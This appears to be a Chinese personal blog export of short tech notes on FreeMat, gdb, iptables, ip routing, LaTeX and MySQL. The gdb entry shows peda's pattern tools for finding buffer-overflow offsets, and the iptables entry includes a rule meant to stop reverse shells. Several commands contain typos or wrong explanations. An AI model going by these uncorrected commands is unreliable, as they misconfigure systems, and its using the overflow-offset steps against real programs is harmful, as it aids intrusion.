  <entry>
    <title>freemat使用说明</title>
    <url>/freemat%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/</url>
    <content><![CDATA[<h1 id="freemat">freemat</h1>
<h2 id="变量与数组">变量与数组</h2>
<h3 id="矩阵">矩阵</h3>
<h4 id="单行一维矩阵创建">单行/一维矩阵创建</h4>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">--&gt; a=[val1,val2,val3,...valn]</span><br><span class="line">--&gt; a=[val1 val2 val3 ...valn]</span><br></pre></td></tr></table></figure>
<h4 id="多行多维矩阵创建">多行/多维矩阵创建</h4>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">--&gt; a=[val1 val2 val3;val4 val5 val6;val7 val8 val9]</span><br><span class="line">--&gt; z=<span class="built_in">zeros</span>(<span class="number">5</span>,<span class="number">1</span>)</span><br><span class="line">--&gt; o=<span class="built_in">ones</span>(<span class="number">7</span>,<span class="number">8</span>)</span><br><span class="line">--&gt; r=<span class="built_in">rand</span>(<span class="number">3</span>,<span class="number">8</span>)</span><br></pre></td></tr></table></figure>
<h4 id="矩阵运算">矩阵运算</h4>
<h5 id="常规运算">常规运算</h5>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">--&gt; a=[<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>;<span class="number">4</span> <span class="number">5</span> <span class="number">6</span>;<span class="number">7</span> <span class="number">8</span> <span class="number">9</span>]</span><br><span class="line">a =</span><br><span class="line"> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span></span><br><span class="line"> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span></span><br><span class="line">--&gt; a+<span class="number">10</span></span><br><span class="line"><span class="built_in">ans</span> =</span><br><span class="line"> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span></span><br><span class="line"> <span class="number">14</span> <span class="number">15</span> <span class="number">16</span></span><br><span class="line"> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> </span><br><span class="line">--&gt; a*<span class="number">10</span></span><br><span class="line"><span class="built_in">ans</span> =</span><br><span class="line"> <span class="number">10</span> <span class="number">20</span> <span class="number">30</span></span><br><span class="line"> <span class="number">40</span> <span class="number">50</span> <span class="number">60</span></span><br><span class="line"> <span class="number">70</span> <span class="number">80</span> <span class="number">90</span></span><br></pre></td></tr></table></figure>
<h5 id="转置矩阵">转置矩阵</h5>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">--&gt; a&#x27;</span><br><span class="line"><span class="built_in">ans</span> =</span><br><span class="line"> <span class="number">1</span> <span class="number">4</span> <span class="number">7</span></span><br><span class="line"> <span class="number">2</span> <span class="number">5</span> <span class="number">8</span></span><br><span class="line"> <span class="number">3</span> <span class="number">6</span> <span class="number">9</span></span><br></pre></td></tr></table></figure>
<h5 id="修改矩阵">修改矩阵</h5>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">--&gt; a(<span class="number">3</span>,<span class="number">3</span>)=<span class="number">10</span></span><br><span class="line">a =</span><br><span class="line">  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span></span><br><span class="line">  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span></span><br><span class="line">  <span class="number">7</span>  <span class="number">8</span> <span class="number">10</span> </span><br></pre></td></tr></table></figure>
<h5 id="逆矩阵">逆矩阵</h5>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">--&gt; inv(a)</span><br><span class="line"><span class="built_in">ans</span> =</span><br><span class="line">   <span class="number">-0.6667</span>   <span class="number">-1.3333</span>    <span class="number">1.0000</span></span><br><span class="line">   <span class="number">-0.6667</span>    <span class="number">3.6667</span>   <span class="number">-2.0000</span></span><br><span class="line">    <span class="number">1.0000</span>   <span class="number">-2.0000</span>    <span class="number">1.0000</span></span><br></pre></td></tr></table></figure>
<h5 id="矩阵相乘">矩阵相乘</h5>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">--&gt; a*inv(a)</span><br><span class="line"><span class="built_in">ans</span> =</span><br><span class="line">    <span class="number">1.0000</span>         <span class="number">0</span>   <span class="number">-0.0000</span></span><br><span class="line">         <span class="number">0</span>    <span class="number">1.0000</span>         <span class="number">0</span></span><br><span class="line">         <span class="number">0</span>         <span class="number">0</span>    <span class="number">1.0000</span> </span><br></pre></td></tr></table></figure>
<h5 id="修改精确度">修改精确度</h5>
<p><strong>精确度表</strong></p>
<table>
<thead>
<tr class="header">
<th>命令</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>format short</td>
<td>精确到小数点后四位</td>
</tr>
<tr class="even">
<td>format long</td>
<td>精确到小数点后十六位</td>
</tr>
<tr class="odd">
<td>format rat</td>
<td>用有理数模拟逼近无理数</td>
</tr>
<tr class="even">
<td>format short e</td>
<td>用科学计数法表示，且精确到小数点后四位</td>
</tr>
<tr class="odd">
<td>format long e</td>
<td>用科学计数法表示，且精确到小数点后十六位</td>
</tr>
</tbody>
</table>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">--&gt; format long</span><br><span class="line">--&gt; a*inv(a)</span><br><span class="line"><span class="built_in">ans</span> =</span><br><span class="line">   <span class="number">1.00000000000000</span>                  <span class="number">0</span>  <span class="number">-0.00000000000000</span></span><br><span class="line">                  <span class="number">0</span>   <span class="number">1.00000000000000</span>                  <span class="number">0</span></span><br><span class="line">                  <span class="number">0</span>                  <span class="number">0</span>   <span class="number">1.00000000000000</span></span><br></pre></td></tr></table></figure>
<h5 id="水平串联">水平串联</h5>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">--&gt; A=[a a]</span><br><span class="line">A =</span><br><span class="line">  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span></span><br><span class="line">  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span></span><br><span class="line">  <span class="number">7</span>  <span class="number">8</span> <span class="number">10</span>  <span class="number">7</span>  <span class="number">8</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>
<h5 id="垂直串联">垂直串联</h5>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">--&gt; A=[a;a]</span><br><span class="line">A =</span><br><span class="line">  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span></span><br><span class="line">  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span></span><br><span class="line">  <span class="number">7</span>  <span class="number">8</span> <span class="number">10</span></span><br><span class="line">  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span></span><br><span class="line">  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span></span><br><span class="line">  <span class="number">7</span>  <span class="number">8</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>
<h5 id="数组索引">数组索引</h5>
<p>数组索引不和普通数组一样从0开始索引，例如二维数组，第一个元素就是A(1,1)</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">--&gt; A(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"><span class="built_in">ans</span> =</span><br><span class="line"> <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h5 id="解除变量">解除变量</h5>
<p><code>clear A</code></p>
<h5 id="结构索引">结构索引</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">variable.fieldname=&#x27;value&#x27;</span><br></pre></td></tr></table></figure>
<h5 id="字段方法">字段方法</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fieldname</span><br><span class="line">getfield(variable,&#x27;field&#x27;)</span><br><span class="line">setfield(variable,&#x27;field&#x27;)</span><br></pre></td></tr></table></figure>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 49%" />
</colgroup>
<thead>
<tr class="header">
<th><a
href="https://ww2.mathworks.cn/help/matlab/ref/struct.html"><code>struct</code></a></th>
<th>结构体数组</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><a
href="https://ww2.mathworks.cn/help/matlab/ref/fieldnames.html"><code>fieldnames</code></a></td>
<td>结构体的字段名称，或者 Java 或 Microsoft COM 对象的公共字段</td>
</tr>
<tr class="even">
<td><a
href="https://ww2.mathworks.cn/help/matlab/ref/getfield.html"><code>getfield</code></a></td>
<td>结构体数组字段</td>
</tr>
<tr class="odd">
<td><a
href="https://ww2.mathworks.cn/help/matlab/ref/isfield.html"><code>isfield</code></a></td>
<td>确定输入是否为结构体数组字段</td>
</tr>
<tr class="even">
<td><a
href="https://ww2.mathworks.cn/help/matlab/ref/isstruct.html"><code>isstruct</code></a></td>
<td>确定输入是否为结构体数组</td>
</tr>
<tr class="odd">
<td><a
href="https://ww2.mathworks.cn/help/matlab/ref/orderfields.html"><code>orderfields</code></a></td>
<td>结构体数组的顺序字段</td>
</tr>
<tr class="even">
<td><a
href="https://ww2.mathworks.cn/help/matlab/ref/rmfield.html"><code>rmfield</code></a></td>
<td>删除结构体中的字段</td>
</tr>
<tr class="odd">
<td><a
href="https://ww2.mathworks.cn/help/matlab/ref/setfield.html"><code>setfield</code></a></td>
<td>为结构体数组字段赋值</td>
</tr>
<tr class="even">
<td><a
href="https://ww2.mathworks.cn/help/matlab/ref/arrayfun.html"><code>arrayfun</code></a></td>
<td>将函数应用于每个数组元素</td>
</tr>
<tr class="odd">
<td><a
href="https://ww2.mathworks.cn/help/matlab/ref/structfun.html"><code>structfun</code></a></td>
<td>对标量结构体的每个字段应用函数</td>
</tr>
<tr class="even">
<td><a
href="https://ww2.mathworks.cn/help/matlab/ref/table2struct.html"><code>table2struct</code></a></td>
<td>将表转换为结构体数组</td>
</tr>
<tr class="odd">
<td><a
href="https://ww2.mathworks.cn/help/matlab/ref/struct2table.html"><code>struct2table</code></a></td>
<td>将结构体数组转换为表</td>
</tr>
<tr class="even">
<td><a
href="https://ww2.mathworks.cn/help/matlab/ref/cell2struct.html"><code>cell2struct</code></a></td>
<td>将元胞数组转换为结构体数组</td>
</tr>
<tr class="odd">
<td><a
href="https://ww2.mathworks.cn/help/matlab/ref/struct2cell.html"><code>struct2cell</code></a></td>
<td>将结构体转换为元胞数组</td>
</tr>
</tbody>
</table>
<h3 id="单元数组">单元数组</h3>
<h4 id="单元数组定义">单元数组定义</h4>
<p>单元数组（<strong>Cell
Array</strong>）将类型不同的相关数据集成到一个单一的变量中，使得大量相关数据的引用和处理变得简单方便；需要注意的是，单元数组仅仅是承载其他数据类型的容器，大部分的数学运算只是针对其中的具体数据进行的，而非针对单元数组本身进行。单元数组中的每一个元素称为单元（<strong>cell</strong>），单元可以包含任何类型的数据，如数值数组、字符、符号对象，甚至于其他的单元数组。单元数组可以使不同类型和不同维数的数组可以共存，细胞型数组实际上可以认为是一种以任意形式的数组为分量的多维数组。</p>
<h4 id="单元数组的赋值">单元数组的赋值</h4>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">A=&#123;row_def1;row_def2;row_def3;...row_defi&#125;</span><br></pre></td></tr></table></figure>
<h4 id="单元定义的赋值">单元定义的赋值</h4>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">row_defi= element_i1,element_i2,element_i3...element_iM</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
  </entry>
  <entry>
    <title>gdb-常用调试指令</title>
    <url>/gdb-%E5%B8%B8%E7%94%A8%E8%B0%83%E8%AF%95%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="背景知识">背景知识</h2>
<h3 id="内存">内存</h3>

<h3 id="栈">栈</h3>

<h3 id="堆">堆</h3>
<p>与栈情况类似,但存储的是文件之类的数据</p>
<h3 id="gdb基本调试命令">GDB基本调试命令</h3>
<p><a
href="https://www.cnblogs.com/qigaohua/p/6077790.html">GDB基本调试命令</a>
<a
href="http://lazybing.github.io/blog/2016/04/01/how-to-use-gdb/">如何使用
GDB</a></p>
<h2 id="gdb工具使用前期配置">GDB工具使用前期配置</h2>
<h3 id="设置对core文件输出大小无限制">设置对core文件输出大小无限制</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su root</span><br><span class="line"></span><br><span class="line">vi /etc/profile</span><br><span class="line">Shift + G</span><br><span class="line">i</span><br><span class="line"><span class="comment"># No core files by default 0, unlimited is oo</span></span><br><span class="line"><span class="built_in">ulimit</span> -S -c unlimited &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">wq!</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>
<h4 id="提示">提示</h4>
<p>在图形界面的虚拟终端下,可能需要每次启动都source一遍<code>/etc/profile</code>,请把source加入你的<code>~/.bashrc</code>或<code>~/.zshrc</code>第一行</p>
<h3 id="设置croe信息转储">设置croe信息转储</h3>
<p>core文件同名会覆盖. 这里为其加上一个 core命名规则, 让其变成
[core.pid] 格式. <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su root</span><br><span class="line"></span><br><span class="line">vi /etc/sysctl.conf</span><br><span class="line">Shift + G</span><br><span class="line">i</span><br><span class="line"></span><br><span class="line"><span class="comment"># open, add core.pid </span></span><br><span class="line">kernel.core_pattern = ./core_%t_%p_%e</span><br><span class="line">kernel.core_uses_pid = 1</span><br><span class="line"></span><br><span class="line">wq!</span><br><span class="line"></span><br><span class="line">sysctl -p /etc/sysctl.conf</span><br></pre></td></tr></table></figure></p>
<h3 id="配置peda">配置peda</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
<h2 id="gdb使用">GDB使用</h2>
<h3 id="常见用法">常见用法</h3>
<ol type="1">
<li>调试程序。有几种方法可以在gdb下运行你的程序：</li>
</ol>
<ul>
<li>gdb ${你的程序} 进入gdb后，输入run(简写r) ${arg1} ${arg2} …
${argN}</li>
<li>gdb --args ${你的程序} ${arg1} ${arg2} … ${argN}
进入gdb后，运行run。</li>
<li>gdb进入gdb后，输入file ${你的程序}。然后使用set args ${arg1} ${arg2}
… ${argN} 设定好你的程序参数，再运行run。</li>
</ul>
<ol start="2" type="1">
<li>调试正在运行的程序：</li>
</ol>
<ul>
<li>gdb ${你的程序} ${程序pid}</li>
</ul>
<ol start="3" type="1">
<li>查core：</li>
</ol>
<ul>
<li>gdb ${你的程序} -core ${core文件}</li>
</ul>
<h4 id="静默模式启动gdb">静默模式启动gdb</h4>
<p><code>gdb -q</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb:b (break) #设置断点</span><br><span class="line"></span><br><span class="line">b func_name #对函数下断点</span><br><span class="line"></span><br><span class="line">b *addr   #对地址下断点</span><br><span class="line"></span><br><span class="line">info b   # 查看断点</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete</span><br><span class="line">用法：delete [breakpoints num] [range...]</span><br><span class="line">delete可删除单个断点，也可删除一个断点的集合，这个集合用连续的断点号来描述。</span><br><span class="line">例如：</span><br><span class="line">delete 5</span><br><span class="line">delete 1-10</span><br><span class="line"></span><br><span class="line">clear</span><br><span class="line">用法:clear </span><br><span class="line">    删除所在行的多有断点。</span><br><span class="line">    clear location</span><br><span class="line">clear 删除所选定的环境中所有的断点</span><br><span class="line">clear location location描述具体的断点。</span><br><span class="line">例如：</span><br><span class="line">clear list_insert         //删除函数的所有断点</span><br><span class="line">clear list.c:list_delet   //删除文件：函数的所有断点</span><br><span class="line">clear 12                  //删除行号的所有断点</span><br><span class="line">clear list.c:12           //删除文件：行号的所有断点</span><br><span class="line"></span><br><span class="line">clear 删除断点是基于行的，不是把所有的断点都删除。</span><br><span class="line"></span><br><span class="line">r #启动加载的程序</span><br><span class="line"></span><br><span class="line">gdb:disas main #查看函数汇编指令</span><br><span class="line"></span><br><span class="line">info r(egister) #查看寄存器情况</span><br><span class="line"></span><br><span class="line">ni #单步调试</span><br><span class="line"></span><br><span class="line">si #step into 步进 进到某个函数里面</span><br><span class="line"></span><br><span class="line">bt  #backtrace 查看现在的堆栈情况   对于了解程序执行比较有用</span><br><span class="line"></span><br><span class="line">c  #continue #继续执行到下一个断点</span><br><span class="line"></span><br><span class="line">x /100xg $rsp  #以八进制查看从栈顶开始的100字节 </span><br></pre></td></tr></table></figure>
<h3 id="pattern-工具">pattern 工具</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pattern 指令,生成长字符串,</span><br><span class="line"></span><br><span class="line">pattern create 150 #生成一个长度为150字节的字符串</span><br><span class="line">pattern offset rip地址 #判断从多少字节开始溢出,前提是程序非正常退出,rip内容被覆盖</span><br></pre></td></tr></table></figure>
<h2 id="参考资料">参考资料</h2>
<p>http://yaov.net/2018/09/15/linux-pwn%E5%9F%BA%E7%A1%801/</p>
]]></content>
      <categories>
        <category>linux工具</category>
      </categories>
  </entry>
  <entry>
    <title>git可视化查看分支</title>
    <url>/git-%E5%8F%AF%E8%A7%86%E5%8C%96%E6%9F%A5%E7%9C%8B%E5%88%86%E6%94%AF/</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span> --pretty=format:<span class="string">&quot;%h %s&quot;</span> --graph</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux工具</category>
      </categories>
  </entry>
  <entry>
    <title>http状态码</title>
    <url>/http%E7%8A%B6%E6%80%81%E7%A0%81/</url>
    <content><![CDATA[<p><a href="https://www.runoob.com/http/http-status-codes.html">HTTP
状态码 | 菜鸟教程 (runoob.com)</a></p>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>iptables-笔记</title>
    <url>/iptables-%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="简单开启22号端口">简单开启22号端口</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -t filter -A INPUT -j DROP -s 172.0.0.1 -p 22</span><br><span class="line">iptables -t filter -A INPUT -j ACCEPT -s 172.16.0.0/16 -d 172.16.100.1 -p tcp --dport 22 </span><br><span class="line">iptables -t filter -A OUTPUT -j ACCEPT -s 172.16.100.7 -d 172.16.0.0/16 -p tcp --sport 22</span><br></pre></td></tr></table></figure>
<h3 id="state模块使用例程">state模块使用例程</h3>
<h4 id="禁止向外打开新的tcp连接">禁止向外打开新的tcp连接</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -A OUTPUT -m state --state NEW -p tcp -s 172.16.0.107 -j DROP</span><br><span class="line">iptables -t filter -A INPUT -p tcp --dport 22 -d 172.16.0.107 -j ACCEPT </span><br><span class="line">iptables -t filter -A OUTPUT -p tcp --sport 22 -s 172.16.0.107 -j ACCEPT</span><br></pre></td></tr></table></figure>
<h4 id="允许ping自己">允许ping自己</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptebles -P INPUT DROP</span><br><span class="line">iptebles -P OUTPUT DROP </span><br><span class="line">iptables -t filter -A INPUT -p icmp --icmp-type 8 -m state --state NEW,ESTABLISHED -d 172.16.0.107 -j DROP</span><br><span class="line">iptebles -t filter -A OUTPUT -p icmp --icmp-type 0 -m state --state ESTABLISHED -s 172.16.0.107 -j ACCEPT </span><br></pre></td></tr></table></figure>
<h4 id="防止反弹shell">防止反弹shell</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -t fliter -A OUTPUT -m state -s 172.16.0.107 --state ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>
<h3 id="ftp协议的特殊性">ftp协议的特殊性</h3>
<h4
id="因为ftp很特殊ip_nat_ftp-ip_conntrack_ftp-模块需要先装载">因为ftp很特殊，ip_nat_ftp
ip_conntrack_ftp 模块需要先装载</h4>
<h4
id="配置文件在etcsysconfigiptables-config在iptables_modules后面填上ip_nat_ftp-和-ip_conntrack_ftp-即可因为ip_nat_ftp依赖ip_conntrack_ftp-所以只需要装载ip_nat_ftp">配置文件在/etc/sysconfig/iptables-config,在IPTABLES_MODULES后面填上ip_nat_ftp
和 ip_conntrack_ftp 即可,因为ip_nat_ftp依赖ip_conntrack_ftp
所以只需要装载ip_nat_ftp</h4>
<h4 id="related-相关性-专为ftp设定">related 相关性 专为FTP设定</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -t filter -A OUTPUT -p tcp -s 172.16.0.107 -m state --state RELATED -j ACCEPT</span><br></pre></td></tr></table></figure>
<h4
id="ip_conntrack是很重要的但是高访问的情况下可能会阻断一部分的传入连接">ip_conntrack是很重要的，但是高访问的情况下可能会阻断一部分的传入连接</h4>
<h4
id="ip_conntrack内核控制旧版内核">ip_conntrack内核控制(旧版内核)</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proc/sys/net/ipv4/netfilter/ip_conntrack_[protocol]</span><br><span class="line">/proc/sys/net/ipv4/ip_conntrack_max</span><br></pre></td></tr></table></figure>
<h4 id="nf_conntrack内核控制">nf_conntrack内核控制</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proc/sys/net/netfilter/nf_conntrack_[protocol]</span><br><span class="line">/proc/sys/net/netfilter/nf_conntrack_max</span><br><span class="line">/proc/sys/net/nf_conntrack_max</span><br></pre></td></tr></table></figure>
<h2 id="显式扩展">显式扩展</h2>
<p>-m state //状态 -m iprange //ip区段 -m multiport //离散端口，最多15个
-m connlimit //最大连接数 -m limit //流量控制 traffic control(流量控制)
token bucket filter -m string //匹配字符串 -m recent //定义规则
防止ddos</p>
<h3 id="设置连接约束">设置连接约束</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 22 -m connlimit --connlimit-above 3 -j DROP //约束最大连接数</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH //设置新连接 //不会拦截,因为没有目标,但是会更新记录</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -m state --state NEW --update --second 300 --hitcount 3 --name SSH -j DROP //检查记录是否符合条件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>    --dnat
    --snat </code></pre>
<h3 id="j-target-target译作动作">-j target 【target译作动作】</h3>
<p>-j ACCEPT DROP RESPECT LOG 自定义链 MASQUERADE
//ppp拨号，外网地址是动态获取的时候使用</p>
<h4 id="从主链转发到自定义链">从主链转发到自定义链</h4>
<p>iptables -A INPUT -j 自定义链</p>
<h4 id="从自定义链返回主链">从自定义链返回主链</h4>
<p>iptables -A 自定义链 -j RETURN</p>
<h3 id="抓包">抓包</h3>
<pre><code>tcpdump -i 网卡 -nn -X icmp</code></pre>
<h3 id="对nat表的操作">对nat表的操作</h3>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">SNAT</th>
<th style="text-align: center;">DNAT</th>
<th style="text-align: center;">PNAT</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">Source</td>
<td style="text-align: center;">destination</td>
<td style="text-align: center;">port</td>
</tr>
<tr class="even">
<td style="text-align: center;">源地址转换</td>
<td style="text-align: center;">目标地址转换</td>
<td style="text-align: center;">端口地址转换</td>
</tr>
</tbody>
</table>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp -d 172.16.100.107 -j SNAT --to-source 更换的源地址:端口 </span><br><span class="line">iptables -t nat -A PREROUTING -p tcp -d 172.16.100.107 -j DNAT --to-destination 更换的目标地址:端口</span><br></pre></td></tr></table></figure>
<h4 id="dmz-区域-非军事化区-服务器使用nat做跳板访问">DMZ 区域 非军事化区
服务器使用nat做跳板访问</h4>
<h3 id="创建自定义链">创建自定义链</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -t filter -N Docker</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux工具</category>
      </categories>
  </entry>
  <entry>
    <title>ip命令</title>
    <url>/ip%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="ip命令">ip命令</h2>
<h3 id="netns">netns</h3>
<p>ip net namespace,网络命名空间相关命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip netns list</span><br><span class="line">ip netns add NAME</span><br><span class="line">ip netns delete NAME</span><br><span class="line">ip netns <span class="built_in">set</span> NAME NETNAID</span><br><span class="line">ip [-all] netns <span class="built_in">exec</span> //执行命令</span><br><span class="line">    ip netns <span class="built_in">exec</span> NAME ifconfig -a //查看所有网卡</span><br><span class="line">    ip netns <span class="built_in">exec</span> NAME ip addr add ip/mask dev DEVICE</span><br></pre></td></tr></table></figure>
<h3 id="link">link</h3>
<p>ip link,网卡相关命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip <span class="built_in">link</span> </span><br><span class="line">ip add NAME <span class="built_in">type</span> TYPE</span><br><span class="line">	ip add veth1.1 <span class="built_in">type</span> veth peer name veth1.2 //创建一对网卡</span><br><span class="line">ip <span class="built_in">link</span> show //查看网卡信息</span><br><span class="line">ip <span class="built_in">link</span> <span class="built_in">set</span> dev veth1.2 netns r1</span><br><span class="line">ip <span class="built_in">link</span> show </span><br><span class="line">ip <span class="built_in">link</span> <span class="built_in">set</span> 网卡名 name 新网卡名</span><br></pre></td></tr></table></figure>
<h3 id="addr">addr</h3>
<p>ip addr,ip地址相关命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip addr</span><br><span class="line">ip addr add</span><br><span class="line">	ip addr add ip/mask dev DEVICE //为网卡设置ip</span><br><span class="line">ip addr del</span><br><span class="line">	ip addr del ip/mask dev DEVICE //为网卡删除ip</span><br></pre></td></tr></table></figure>
<h3 id="route">route</h3>
<p>ip route,路由相关命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip route </span><br><span class="line">ip route add </span><br><span class="line">//添加默认路由，到网络的路由，到主机的路由</span><br><span class="line">	ip route add via gateway dev DEVICE</span><br><span class="line">	ip route add ip/mask via gateway dev DEVICE</span><br><span class="line">	ip route add ipaddr via gateway dev DEVICE</span><br><span class="line">//删除默认路由，到网络的路由，到主机的路由</span><br><span class="line">ip route del ip</span><br><span class="line">	ip route del via gateway dev DEVICE</span><br><span class="line">	ip route del ipaddr via gateway dev DEVICE</span><br><span class="line">	ip route del ipaddr via gateway dev DEVICE</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>java-流</title>
    <url>/java-%E6%B5%81/</url>
    <content><![CDATA[<h2 id="文件操作">文件操作</h2>
<p>文件字节流：FileInputStream,FileOutputStream</p>
<p>文件字符流：FileReader,FileWriter</p>
<h3 id="inputstreamreader解码">InputStreamReader：解码</h3>
<h3 id="outputstreamwriter编码">OutputStreamWriter：编码</h3>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
  </entry>
  <entry>
    <title>latex常用技巧</title>
    <url>/latex%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h3 id="定义float">定义float</h3>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 引入float</span></span><br><span class="line"><span class="keyword">\usepackage</span>&#123;float&#125;</span><br><span class="line"><span class="comment">% 定义名称位置float组件拓展名</span></span><br><span class="line"><span class="comment">%\newfloat&#123;名称&#125;&#123;位置:t/b/p:Top/Bottom/Page&#125;[拓展名]</span></span><br><span class="line"><span class="keyword">\newfloat</span>&#123;pageend&#125;&#123;b&#125;</span><br><span class="line"><span class="keyword">\begin</span>&#123;pageend&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;pageend&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="设置页码">设置页码</h3>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\thispagestyle</span>&#123;empty&#125;</span><br><span class="line"><span class="comment">% 当前页不显示页码,如果是论文首页,在\maketitle之前使用这条指令,之后再使用\newpage另起一页</span></span><br><span class="line"><span class="keyword">\setcounter</span>&#123;page&#125;&#123;1&#125;</span><br><span class="line"><span class="comment">% 设置当前页页码，后面的页码自动加一</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h3 id="设置空行间隔">设置空行间隔</h3>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\\</span>[10pt] </span><br><span class="line"><span class="comment">% 设置两行之间10个像素点的距离</span></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>linux设备事件</title>
    <url>/linux%E8%AE%BE%E5%A4%87%E4%BA%8B%E4%BB%B6/</url>
    <content><![CDATA[<p>udevadm</p>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>mysql-笔记</title>
    <url>/mysql-%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="mysql">mysql</h1>
<h2 id="密码与访问">密码与访问</h2>
<h4 id="配置远程访问">配置远程访问</h4>
<h5 id="授权法">授权法</h5>
<p><code>GRANT priv_type ON database.table TO user [IDENTIFIED BY [PASSWORD]]</code></p>
<ul>
<li>priv_type 参数表示新用户的权限；</li>
<li>database.table
参数表示新用户的权限范围，即只能在指定的数据库和表上使用自己的权限；</li>
<li>user 参数指定新用户的账号，由用户名和主机名构成；</li>
<li>IDENTIFIED BY 关键字用来设置密码；</li>
<li>password 参数表示新用户的密码。</li>
</ul>
